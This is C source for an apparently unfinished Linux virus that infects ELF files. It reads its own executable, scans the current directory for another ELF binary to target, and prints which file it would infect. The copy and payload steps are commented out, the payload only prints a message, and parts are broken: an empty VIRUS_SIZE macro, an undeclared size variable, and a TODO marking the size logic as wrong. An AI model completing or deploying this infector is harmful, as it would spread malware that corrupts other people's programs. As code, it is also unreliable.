#include <stdio.h>
#include <stdlib.h>
#include <libgen.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

#define VIRUS_SIZE

int isElf(char *name);
char *findCleanELF(ino_t self);
void executePayload();

int main(int argc, char** argv) {

  // Copy virus into memory
  char *name = basename(argv[0]);
  int virus_fd = open(name, O_RDONLY);
  if(virus_fd == -1) { 
    perror("error opening file");
    return 1; 
  }

  struct stat st;
  fstat(virus_fd, &st);
  // TODO: This is wrong and has to change
  // printf("size of file: %d\n", virus_size);

  // Find a clean ELF file to infect
  char *to_infect = findCleanELF(st.st_ino);
	printf("File to infect: %s\n", to_infect);

  /*
  // Read into memory
  char virus_buffer[virus_size];
  if(read(virus_fd, virus_buffer, virus_size) < virus_size) {
    perror("error reading virus");
    return 1;
  }

  // Copy virus into tmp file
  char *tmp_name = "tmp_virus";
  int tmp_fd = open(tmp_name, O_CREAT | O_RDWR);
  if(tmp_fd == -1) {
    perror("error opening tmp file");
    return 1;
  }
  if(write(tmp_fd, virus_buffer, virus_size) == -1) {
    perror("error writing to tmp file");
    return 1;
  } */

  // Execute the virus payload
  // executePayload();

  // close(tmp_fd);
  close(virus_fd);

  return 0;
}

int isElf(char *name) {
	// open the file
	int file_fd = open(name, O_RDONLY);
	if(file_fd == -1) {
    perror("error opening file");
		return -1;
	}
	// read the header
	char file_hdr[4];
	if(read(file_fd, file_hdr, 4) < 4) {
		perror("error reading file");
		return -1;
	}
	close(file_fd);

	// Check if the file has magic numbers
	if(file_hdr[0] == 0x7F && file_hdr[1] == 'E' && file_hdr[2] == 'L' && 
		file_hdr[3] == 'F') { return 1; }
	return -1;
}

char *findCleanELF(ino_t self) {
  // open current directory
  DIR *dir = opendir(".");
  struct dirent *entry;
  while((entry = readdir(dir)) != NULL) {
		// Check that it is a clean ELF file, not itself
		if(entry->d_type == DT_REG && entry->d_ino != self && isElf(entry->d_name) != -1) { 
			closedir(dir);
			return entry->d_name; 
		}
  }
	closedir(dir);
	printf("No clean ELF found\n");
	exit(0);
}

void executePayload() {
  printf("Virus Payload\n");
}
